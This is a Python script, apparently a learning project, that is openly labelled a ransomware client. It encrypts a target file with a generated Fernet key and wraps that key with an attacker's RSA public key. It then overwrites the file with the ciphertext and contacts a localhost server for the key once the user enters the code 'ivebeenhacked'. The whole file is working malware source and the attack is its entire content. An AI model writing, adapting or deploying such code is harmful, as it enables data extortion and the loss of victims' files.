#!/usr/bin/env python3
import socket
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet
from os import path,remove

# Author : Bobby Valenzuela
# Created : 14th January 2023

"""
Description: This script encrypts the target file with a newly generated symmetric key (SK).
To make sure this new key can't just decrypt the target file - the key is itself in encrypted using the hosts public key.
This results in the "EncryptedSymmetricKey" (ESK) - only hosts private key can get the original symmetric key back.

Once your target file is encrypted - you will be prompted to enter the secret code to decrypt your targefile again.
The code is : "ivebeenhacked"

Once this code is entered the ESK will be sent to the server (server file must be running first to handle this request). 
Server file will decrypt the ESK and send the original symmetric key (SK) back to this client script.
Next, this script will decrypt the target file.
Lastly this file will delete the ESK.

Usage: python3 Ransomeware_client.py
"""

##################
#   GLOBALS      
##################

SERVER_HOST, SERVER_PORT = "localhost",5000
TARGET_FILE = "targetfile.txt"   # Target file to encrypt as port of this ransomware
HOST_PUB_KEY_PATH = 'client_keys/public_key.pem'      # Hackers public key | # Here we place the public key used to encrypt our client's symmetric key later
CLIENT_ENC_SYM_KEY_PATH = "./clientEncryptedSymmetricKey.key"

##################
#   FUNCTIONS      
##################

# Decrypts clientEncryptedSymmetricKey to reveal client symmetric key
def decryptFile(filePath, key):

    # Read + Decrypt encrypted file
    with open(filePath, "rb") as encrypted_file:
        encrypted_msg = encrypted_file.read()
        # Client symmetric key was created from a Fernet key (and encrypted as such) - we need to open it as a FernetInstance
        FernetInstance_client = Fernet(key)
        # Now we can decrypt
        unencrypted_data = FernetInstance_client.decrypt(encrypted_msg)
        
        unencrypted_data_str = unencrypted_data.decode()
        # Overwrite the target file with the decrypted+decoded string
        with open(filePath, "w") as file:
            file.write(unencrypted_data_str)

# Send the key to ransomewareServer
def sendEncryptedKey(eKeyFilePath):

    with socket.create_connection((SERVER_HOST, SERVER_PORT)) as sock:
        # Reuse existing socket if present
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # Read and send over our encrypted file    
        with open(eKeyFilePath, "rb") as key_file:
            enc_key = key_file.read()

        sock.sendall(enc_key)
        # Server should decrypt our key and send it back
        key_from_server = sock.recv(1024).strip()
        
        response = str(input("Enter the secret code: "))

        if response == 'ivebeenhacked' :
            print("Correct Code. Decrypting file...")
            # Now we can decrypt our original file that was held for ransom
            decryptFile(TARGET_FILE,key_from_server)
            # Now delete the key...
            remove(CLIENT_ENC_SYM_KEY_PATH)
            print("Decryption Complete!")

        else:

            print("Incorrect code!")
            exit()
            print("Still here...")

##################
#   MAIN      
##################

# First - if there is an encrypted key - then we must have already encrypted the target text
if path.isfile(CLIENT_ENC_SYM_KEY_PATH):
    print("File encrypted...")
    sendEncryptedKey(CLIENT_ENC_SYM_KEY_PATH)
    exit()

# Creates a Fernet key (token) - uses AES-128-bit in CBC mode as a primitive
clientSymmetricKey = Fernet.generate_key() # Key used to

# By loading our clientSymmetricKey in a Fernet class - we have more methods we can use (encrypt/decrypt)
FernetInstance = Fernet(clientSymmetricKey)

# Read our public key + save into memory as public_key (rb = read binary)
with open(HOST_PUB_KEY_PATH,"rb") as key_file:
    hostPublicKey = serialization.load_pem_public_key(
        key_file.read(),
        backend=default_backend()
    )

# Encrypt our clientSymmetricKey key with our hostPublicKey - use OAEP as well for padding
clientEncryptedSymmetricKey = hostPublicKey.encrypt(
    clientSymmetricKey,
    padding.OAEP(
        mgf = padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
)

# Write our encrypted clientEncryptedSymmetricKey to a file (wb = write binary)
with open(CLIENT_ENC_SYM_KEY_PATH, "wb") as key_file:
    key_file.write(clientEncryptedSymmetricKey)

# Save Encrypted file data in memory under 'encrypted_data' 
with open(TARGET_FILE,"rb") as file:
    file_data = file.read()
    encrypted_data = FernetInstance.encrypt(file_data)

# Overwrite the file with the encrypted data
with open(TARGET_FILE, "wb") as file:
    file.write(encrypted_data)

# Once everything is done - send encrypted key to server
sendEncryptedKey(CLIENT_ENC_SYM_KEY_PATH)

quit()

